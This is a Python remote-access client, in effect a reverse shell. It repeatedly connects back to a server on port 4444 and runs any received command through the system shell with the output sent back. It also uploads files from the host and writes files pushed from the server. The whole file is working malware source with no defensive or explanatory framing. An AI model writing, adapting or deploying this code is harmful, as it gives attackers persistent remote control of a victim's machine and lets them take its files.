import socket
import time
import threading
import subprocess
import os

class Client:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.s = None
        self.send_lock = threading.Lock()

    def send_msg(self, msg_str):
        msg_bytes = msg_str.encode('utf-8')
        msg_len = len(msg_bytes).to_bytes(4, "big")
        with self.send_lock:
            self.s.sendall(msg_len + msg_bytes)

    
    def execute(self, command):
        print(f"Executing command: {command}")
        if command.strip().lower().startswith("cd "):
            try:
                target_dir = command.strip()[3:].strip()
                os.chdir(target_dir)
                self.send_msg(f"Changed directory to {os.getcwd()}")
            except Exception as e:
                self.send_msg(f"Error: {e}")
            return

        elif command.startswith("get "):
            try:
                filename = command.split()[1]
                if os.path.exists(filename):
                    filesize = os.path.getsize(filename)
                    self.send_msg(f"FILE:{filename}:{filesize}")
                    with open(filename, "rb") as f:
                        with self.send_lock:
                            self.s.sendall(f.read())
                else:
                    self.send_msg("File not found")
            except Exception as e:
                self.send_msg(f"Error sending file: {e}")
            return
         # Handle file upload from server (put)
        elif command.startswith("put "):
            parts = command.split()
            filename = parts[1]
            filesize = int(parts[2])
            data = self.recv_exact(filesize)
            with open(filename, "wb") as f:
                f.write(data)
            self.send_msg(f"Successfully saved {filename}")
                    

        try:
            print(f"Executing command: {command}")
            proc = subprocess.Popen(command,
                                    shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            output, err = proc.communicate()
            output = output.decode(errors='replace') if output else ""
            err = err.decode(errors='replace') if err else ""
            self.send_msg(output + err)
        except FileNotFoundError:
            self.send_msg("No such file or directory")
        except Exception as e:
            self.send_msg(f"Error: {e}")

    def recv_exact(self,n):
        data = b""
        while len(data) < n:
            chunk = self.s.recv(n - len(data))
            if not chunk:
                raise ConnectionError("Connection closed")
            data += chunk
        return data

    def get_data(self):
        size_bytes = self.recv_exact(4)
        msg_size = int.from_bytes(size_bytes, 'big')
        data = self.recv_exact(msg_size)
        decoded = data.decode('utf-8')
        return decoded

    def listen(self):
        while True:
            try:
                command = self.get_data()
            except ConnectionError:
                break
            t = threading.Thread(target=self.execute, args=(command,))
            t.daemon = True
            t.start()

    def waiting(self):
        while True:
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((self.server_ip, self.server_port))
                self.listen()
            except:
                time.sleep(5)
            finally:
                try:
                    self.s.close()
                except:
                    pass
    

if __name__ == "__main__":
    client = Client("127.0.0.1", 4444)
    client.waiting()